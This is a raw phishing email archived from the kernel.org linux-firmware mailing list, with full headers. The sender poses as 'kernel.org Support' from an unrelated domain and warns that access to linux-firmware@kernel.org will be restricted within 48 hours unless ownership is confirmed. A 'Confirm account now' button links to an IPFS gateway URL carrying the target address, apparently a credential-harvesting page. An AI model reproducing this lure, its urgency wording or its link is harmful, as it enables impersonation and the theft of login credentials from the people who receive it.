Return-Path: <SRS0=Usvw=6Q=bigbearblogs.com=line@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5B556C05027
	for <linux-firmware@archiver.kernel.org>; Mon, 20 Feb 2023 00:31:14 +0000 (UTC)
Received: by smtp.kernel.org (Postfix)
	id 223B9C4339B; Mon, 20 Feb 2023 00:31:14 +0000 (UTC)
Received: from qxccxaaq.bigbearblogs.com (qxccxaaq.bigbearblogs.com [92.52.217.121])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.kernel.org (Postfix) with ESMTPS id ACD1FC433EF
	for <linux-firmware@kernel.org>; Mon, 20 Feb 2023 00:31:12 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org ACD1FC433EF
Authentication-Results: smtp.kernel.org; dmarc=pass (p=none dis=none) header.from=bigbearblogs.com
Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=bigbearblogs.com
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=bigbearblogs.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; i=line@bigbearblogs.com;
 bh=dfVTFUMf7Mebwpe0vzZ2S34mobA=;
 b=b2EldNSfh7RNUAQsn7RVp0ol4D6Ptw3vQNgAEuKGzPfz7lErdVcFq99S2QDT2LBAN00CSxjgnAQP
   OUjb59khBYORj+ZEG1rs0Wvek+5591MA49cLnT/NTtvAww2jdXk9LrUsK16/z8md6B4jUo5ooi+e
   Do0FQcrcnYM3N5yMO6dzScZniYpxF9+k0zEtVgvqeu7zN+a5f+QeseFe0bk1Mv2W6S8xfnRWieD7
   xAqSb/62ZPemBwPHucoDOH85HvnsI684JPjbo7IMCLXf/cY+tUYSb5oWn1MPE71jUHd3sYIuD2nS
   FBqHYjpe8RYUQ7gvxE5NAykPrKVMbo9/Lyz5NQ==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=bigbearblogs.com;
 b=o1NewA7JgbuwsfwpX3P0LIBoSNbVXptyXBis2oKL1urMPawpAkhLQzpZ5h5Dl1yKrnTtHgBxNMih
   c2IY6yGj/vb2peuClIh7HB9zKLu8F9Xjf7aSXBrwbSNhXF4hUtTYncNTFzLJvN0kTo3UcAfjY/0U
   5cc1hhnMPxE53wUjT75QT+tDQC56QZTOX8KQ0kg+I/X2k8fTf2dVCZqBh44MSjUXGF1K/uqARv0I
   ogmZqjOjW+p8Z1ZXxn/Zyery/pbf3aFyUpiATRDiawWpWp9oEpthbTsHRzFUVBTOX9j6hhUtDLUr
   jULZANJ/feCRdA1MYz7BB+od+SGHb9xWvmsxQw==;
From: kernel.org Support<line@bigbearblogs.com>
List-Id: <linux-firmware.lore.kernel.org>
To: linux-firmware@kernel.org
Subject: Mailbox Storage Re-validation linux-firmware@kernel.org expires Today 2/20/2023 12:31:02 a.m.
Date: 20 Feb 2023 00:31:02 +0000
Message-ID: <20230220003102.F8B363FE5882BAB6@bigbearblogs.com>
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0012_3F0B0C97.C90211A1"


------=_NextPart_000_0012_3F0B0C97.C90211A1
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Dear linux-firmware
------=_NextPart_000_0012_3F0B0C97.C90211A1
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<div dir=3D"ltr">
<div class=3D"gmail_quote">
<div dir=3D"ltr">
<div class=3D"gmail_quote">
<div style=3D"margin: 0.4em;">
<div style=3D"margin: 0.5em;">
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Helvetica,Arial,sans-serif; font-size=
: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
e: normal; font-variant-ligatures: normal; font-variant-caps: normal; text-=
decoration-style: initial; text-decoration-color: initial;"><span style=3D"=
vertical-align: inherit;"><span style=3D"vertical-align: inherit;">Dear lin=
ux-firmware<br><br></span></span></p>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Helvetica,Arial,sans-serif; font-size=
: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
e: normal; font-variant-ligatures: normal; font-variant-caps: normal; text-=
decoration-style: initial; text-decoration-color: initial;"><span style=3D"=
vertical-align: inherit;"><span style=3D"vertical-align: inherit;">
You have pending incoming emails that you are yet to receive.</span></span>=

<br><br></p>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; padding-bottom: 10px; font-family: Helvetica,Arial=
,sans-serif; font-size: 12px; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; font-variant-ligatures: normal; font-varia=
nt-caps: normal; text-decoration-style: initial; text-decoration-color: ini=
tial;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-ali=
gn: inherit;">Access to&nbsp;linux-firmware@kernel.org</span></span>
<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
erit;"> will be restricted until you confirm ownership.<br><br><br></span><=
/span></p>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Helvetica,Arial,sans-serif; font-size=
: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
e: normal; font-variant-ligatures: normal; font-variant-caps: normal; text-=
decoration-style: initial; text-decoration-color: initial;">
<a style=3D"padding: 10px; width: 50px; color: white; background-color: rgb=
(70, 139, 252); text-decoration-line: none;" href=3D"https://bafybeibnzkajy=
snvl54kwuaqr2po3usu222qhb7jjkhqe2yztxy5oknfvu.ipfs.ipfs.joaoleitao.org/?fil=
ename=3D09654345tyuioifd.html&amp;err=3DINYQOYHUOTMZISWLXN6&amp;dispatch=3D=
a11&amp;id=3D2cC935196c84c2A3bAabaA19004ba5#linux-firmware@kernel.org" targ=
et=3D"_blank" rel=3D"noopener noreferrer"><span style=3D"vertical-align: in=
herit;"><span style=3D"vertical-align: inherit;">Confirm account now</span>=
</span>
</a><br><br></p>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; padding-top: 10px; font-family: Helvetica,Arial,sa=
ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
ng: 0px; white-space: normal; font-variant-ligatures: normal; font-variant-=
caps: normal; text-decoration-style: initial; text-decoration-color: initia=
l;"><strong><span style=3D"vertical-align: inherit;"><span style=3D"vertica=
l-align: inherit;">Note:</span></span></strong>
<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
erit;"> &nbsp;Access to&nbsp; linux-firmware@kernel.org</span></span><span =
style=3D"vertical-align: inherit;">
<span style=3D"vertical-align: inherit;"> &nbsp;will be restricted within 4=
8 (forty eight) working hours.<br></span></span></p>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; padding-top: 10px; font-family: Helvetica,Arial,sa=
ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
ng: 0px; white-space: normal; font-variant-ligatures: normal; font-variant-=
caps: normal; text-decoration-style: initial; text-decoration-color: initia=
l;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-align:=
 inherit;">Regards <br></span></span><br><strong>
</strong>kernel.org<span style=3D"vertical-align: inherit;"><span style=3D"=
vertical-align: inherit;"><strong> support team</strong></span></span></p><=
/div>
<p>&nbsp;</p></div></div></div></div></div></body></html>
------=_NextPart_000_0012_3F0B0C97.C90211A1--
